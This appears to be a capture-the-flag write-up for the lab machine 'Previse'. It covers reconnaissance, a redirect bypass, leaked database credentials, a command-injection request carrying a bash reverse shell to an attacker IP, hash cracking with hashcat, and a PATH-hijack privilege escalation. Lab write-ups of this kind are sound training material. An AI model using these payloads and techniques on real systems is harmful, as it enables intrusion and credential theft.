# Previse
by phoenix
11.12.2021

### NMAP 
```
Host is up (0.050s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-title: Previse Login
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### GOBUSTER
```
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.104/js/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.104/css/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]                 
/login.php            (Status: 200) [Size: 2224]                              
/download.php         (Status: 302) [Size: 0] [--> login.php]                 
/logs.php             (Status: 302) [Size: 0] [--> login.php]                 
/files.php            (Status: 302) [Size: 4914] [--> login.php]              
/config.php           (Status: 200) [Size: 0]                                 
/index.php            (Status: 302) [Size: 2801] [--> login.php]
/accounts.php         (Status: 302) [Size: 3994] [--> login.php]              
/nav.php              (Status: 200) [Size: 1248]                              
/header.php           (Status: 200) [Size: 980]                               
/footer.php           (Status: 200) [Size: 217]                               
/status.php           (Status: 302) [Size: 2968] [--> login.php]              
/server-status        (Status: 403) [Size: 277]
```


### Web server

HTTP POST attempt at login

```
POST /login.php HTTP/1.1
Host: 10.10.11.104
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://10.10.11.104
Connection: close
Referer: http://10.10.11.104/login.php
Cookie: PHPSESSID=48sfje0s37h12vmu57qa491tp9
Upgrade-Insecure-Requests: 1

username=admin&password=admin
```

Connecting to /accounts.php and intercepting the response allows to change the 302 response code to 200. Can now access the accounts creation page.

After logging in you can download `siteBackup.zip`, which cointains the following MySQL credentials
```
root:mySQL_p@ssw0rd!:)
```

After checking the management menu we can download out.log:

```
time,user,fileID
1622482496,m4lwhere,4
1622485614,m4lwhere,4
1622486215,m4lwhere,4
1622486218,m4lwhere,1
1622486221,m4lwhere,1
1622678056,m4lwhere,5
1622678059,m4lwhere,6
1622679247,m4lwhere,1
1622680894,m4lwhere,5
1622708567,m4lwhere,4
1622708573,m4lwhere,4
1622708579,m4lwhere,5
1622710159,m4lwhere,4
1622712633,m4lwhere,4
1622715674,m4lwhere,24
1622715842,m4lwhere,23
1623197471,m4lwhere,25
1623200269,m4lwhere,25
1623236411,m4lwhere,23
1623236571,m4lwhere,26
1623238675,m4lwhere,23
1623238684,m4lwhere,23
1623978778,m4lwhere,32
1639248269,username,32
1639248298,username,32
1639248306,username,32
1639248308,username,32
1639248348,username,32
1639248359,username,32
1639248814,username,1
1639248818,username,2
1639248823,username,3
1639248951,username,5
1639248955,username,31
1639248958,username,33
1639248962,username,35
1639249020,admin123,32
1639249509,urmum,32
1639250696,attacker,32
```

Unique usernames:
```
m4lwhere
username
urmum
```

### Initial access

Looking at the `logs.php` code, it's using a potentially vulnerable exec() funtion, which allows us remote execution

```
POST /logs.php HTTP/1.1
Host: 10.10.11.104
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 71
Origin: http://10.10.11.104
Connection: close
Referer: http://10.10.11.104/file_logs.php
Cookie: PHPSESSID=48sfje0s37h12vmu57qa491tp9
Upgrade-Insecure-Requests: 1

delim=comma%26/bin/bash+-c+'bash+-i+>+/dev/tcp/10.10.14.98/9001+0>%261'
```

Now we can access mysql with the credentials

```
mysql> select * from accounts;
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | alice    | $1$🧂llol$eBQMPwAvz9j9ZpK62qDI// | 2021-12-11 18:18:00 |
|  3 | toto1    | $1$🧂llol$gmxpccBdovvrEKyq6HwCa0 | 2021-12-11 18:19:21 |
|  4 | notuser  | $1$🧂llol$79cV9c1FNnnr7LcfPFlqQ0 | 2021-12-11 18:30:38 |
|  5 | robo123  | $1$🧂llol$JCESjSwOT.SR6o8ib5o1t. | 2021-12-11 18:33:32 |
|  6 | admin123 | $1$🧂llol$wzYjWk/p5usz8BzxvPrXs1 | 2021-12-11 18:42:35 |
|  7 | username | $1$🧂llol$79cV9c1FNnnr7LcfPFlqQ0 | 2021-12-11 18:43:56 |
|  8 | urmum    | $1$🧂llol$Bzg2ECZoERc95bJ0vlG8P0 | 2021-12-11 19:04:03 |
|  9 | attacker | $1$🧂llol$kHSoPzijfmwc4vYAY2Bcj0 | 2021-12-11 19:24:28 |
+----+----------+------------------------------------+---------------------+
```

Crack the hash
```
hashcat -a 0 -m 500 passhash.txt /usr/share/wordlists/rockyou.txt
```

m4lwhere:ilovecody112235!

User flag

sudo -l shows you can run a backup script with root privs.

```
root@previse:/opt/scripts# cat access_backup.sh 
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

As it uses static names we can:
1. Add the /dev/shm dir to path
2. Create a "date" script with reverse nc shell
3. Change perms to 777
4. Run the script that gives you root shell




















